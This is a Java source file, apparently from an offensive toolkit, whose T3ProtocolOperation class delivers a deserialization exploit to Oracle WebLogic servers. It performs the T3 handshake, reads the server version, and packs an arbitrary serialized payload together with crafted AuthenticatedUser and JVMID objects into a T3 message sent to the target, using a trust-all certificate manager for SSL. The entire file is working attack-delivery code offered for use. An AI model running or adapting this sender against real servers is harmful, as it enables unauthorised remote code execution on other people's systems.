package com.Jasetol.payloads.weblogic;

import com.Jasetol.utils.SerWithUnSer;
import weblogic.rjvm.JVMID;
import weblogic.security.acl.internal.AuthenticatedUser;

import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.TrustManager;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.net.Socket;
import java.security.SecureRandom;

public class T3ProtocolOperation {

    private static Boolean isSSL = false;

    private static byte charToByte(char c) {
        return (byte) "0123456789ABCDEF".indexOf(c);
    }

    public static byte[] hexStringToBytes(String hexString) {
        if (hexString != null && !hexString.equals("")) {
            hexString = hexString.toUpperCase();
            int length = hexString.length() / 2;
            char[] hexChars = hexString.toCharArray();
            byte[] d = new byte[length];

            for (int i = 0; i < length; ++i) {
                int pos = i * 2;
                d[i] = (byte) (charToByte(hexChars[pos]) << 4 | charToByte(hexChars[pos + 1]));
            }

            return d;
        } else {
            return null;
        }
    }

    public static String bytesToHexString(byte[] src) {
        StringBuilder stringBuilder = new StringBuilder("");
        if (src == null || src.length <= 0) {
            return null;
        }
        for (int i = 0; i < src.length; i++) {
            int v = src[i] & 0xFF;
            String hv = Integer.toHexString(v);
            if (hv.length() < 2) {
                stringBuilder.append(0);
            }
            stringBuilder.append(hv);
        }
        return stringBuilder.toString();
    }

    public static Socket newSocket(String host, int port) throws Exception {
        Socket socket = null;
        if (isSSL) {
            SSLContext context = SSLContext.getInstance("SSL");
            // 初始化
            context.init(null,
                    new TrustManager[]{new TrustManagerImpl()},
                    new SecureRandom());
            SSLSocketFactory factory = context.getSocketFactory();
            socket = factory.createSocket(host, port);
        } else {
            socket = new Socket(host, port);
        }

        return socket;
    }

    public static void send(String host, int port, byte[] payload) throws Exception {
        Socket s = newSocket(host, port);
        String header = "t3 7.0.0.0\nAS:10\nHL:19\n\n";

        if (isSSL) {
            header = "t3s 7.0.0.0\nAS:10\nHL:19\n\n";
        }

        s.getOutputStream().write(header.getBytes());
        s.getOutputStream().flush();
        BufferedReader br = new BufferedReader(new InputStreamReader(s.getInputStream()));
        String versionInfo = br.readLine();
        versionInfo = versionInfo.replace("HELO:", "");
        versionInfo = versionInfo.replace(".false", "");
        System.out.println("weblogic version:" + versionInfo);
        String cmd = "08";
        String qos = "65";
        String flags = "01";
        String responseId = "ffffffff";
        String invokableId = "ffffffff";
        String abbrevOffset = "00000000";
        String countLength = "01";
        String capacityLength = "10";//必须大于上面设置的AS值
        String readObjectType = "00";//00 object deserial 01 ascii

        StringBuilder datas = new StringBuilder();
        datas.append(cmd);
        datas.append(qos);
        datas.append(flags);
        datas.append(responseId);
        datas.append(invokableId);
        datas.append(abbrevOffset);

        //because of 2 times deserial
        countLength = "04";
        datas.append(countLength);

        //define execute operation
        String pahse1Str = bytesToHexString(payload);
        datas.append(capacityLength);
        datas.append(readObjectType);
        datas.append(pahse1Str);

        //for compatiable fo hide
        //for compatiable fo hide
        AuthenticatedUser authenticatedUser = new AuthenticatedUser("weblogic", "admin123");
        String phase4 = bytesToHexString(SerWithUnSer.serializeObject(authenticatedUser));
        datas.append(capacityLength);
        datas.append(readObjectType);
        datas.append(phase4);

        JVMID src = new JVMID();

        Constructor constructor = JVMID.class.getDeclaredConstructor(java.net.InetAddress.class,boolean.class);
        constructor.setAccessible(true);
        src = (JVMID)constructor.newInstance(InetAddress.getByName("127.0.0.1"),false);
        Field serverName = src.getClass().getDeclaredField("differentiator");
        serverName.setAccessible(true);
        serverName.set(src,1);

        datas.append(capacityLength);
        datas.append(readObjectType);
        datas.append(bytesToHexString(SerWithUnSer.serializeObject(src)));

        JVMID dst = new JVMID();

        constructor = JVMID.class.getDeclaredConstructor(java.net.InetAddress.class,boolean.class);
        constructor.setAccessible(true);
        src = (JVMID)constructor.newInstance(InetAddress.getByName("127.0.0.1"),false);
        serverName = src.getClass().getDeclaredField("differentiator");
        serverName.setAccessible(true);
        serverName.set(dst,1);
        datas.append(capacityLength);
        datas.append(readObjectType);
        datas.append(bytesToHexString(SerWithUnSer.serializeObject(dst)));

        byte[] headers = hexStringToBytes(datas.toString());
        int len = headers.length + 4;
        String hexLen = Integer.toHexString(len);
        StringBuilder dataLen = new StringBuilder();

        if (hexLen.length() < 8) {
            for (int i = 0; i < (8 - hexLen.length()); i++) {
                dataLen.append("0");
            }
        }

        dataLen.append(hexLen);
        s.getOutputStream().write(hexStringToBytes(dataLen + datas.toString()));
        s.getOutputStream().flush();
        s.close();

    }

}